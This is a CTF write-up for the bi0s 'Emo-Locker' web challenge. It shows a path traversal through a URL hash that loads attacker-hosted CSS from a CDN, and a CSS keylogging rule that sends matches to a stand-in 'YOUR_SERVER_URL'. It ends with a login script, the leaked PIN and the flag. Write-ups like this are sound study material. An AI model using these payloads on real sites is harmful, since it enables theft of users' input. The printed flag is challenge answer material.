Web Emo-Locker: (we solved it 1 hour after the event finished, as we didn't get enough time due to playing the previous CTF)

Going to `http://web.chall.bi0s.in:10101/` on chrome and checking Sources, we'll find the source as it's running on dev mode.
Looking at the file static/js/index.js we see a really interesting point:

```js
switchTheme() {
    this.setState((prevState) => {
        let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${
            window.location.hash.replace("#", '')
        }-mode.css`;
        prevState.link_obj.href = href;
        return {}
    });
}
```

There's a `css` script loaded for themes, we have limited control over the input but there's tricks to do keylogging via `CSS`.
But can we provide our own css, the short answer is yes, after digging we found that you can load a file from github by using `https://cdn.jsdelivr.net/gh/user/repo@version/file`. 

After some trial and fail, we ended up with the script: 

```CSS
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

You do this for all 163 numbers.

Then our final payload was:
`http://web.chall.bi0s.in:10101/#../../../../gh/user/repo@version/file?`
The `?` is to ignore the `-mode.css`, or you can just name your file `anything-mode.css` and not use the `?`.

Then send the URL to admin bot and you get the password: `51,32,73,34,85,126,17,158,79,50`

Then you can just login with python or BURP and you'll get the FLAG in cookie:

```python
import requests

json_data = {
    'username': 'admin',
    'pin': [51,32,73,34,85,126,17,158,79,50,],
}
response = requests.post('http://web.chall.bi0s.in:10101/api/login', json=json_data)
print(response.text)
print(response.cookies)
```

And you get the result:

```js
{"status":"Welcome admin !"}
```


And cookie:

```java
<RequestsCookieJar[<Cookie auth=bi0sctf%7Ba34522e2009192570c840f931e4c3c0a%7D for web.chall.bi0s.in/>]>
```


And then you just URL decode the auth and you get: `bi0sctf{a34522e2009192570c840f931e4c3c0a}`
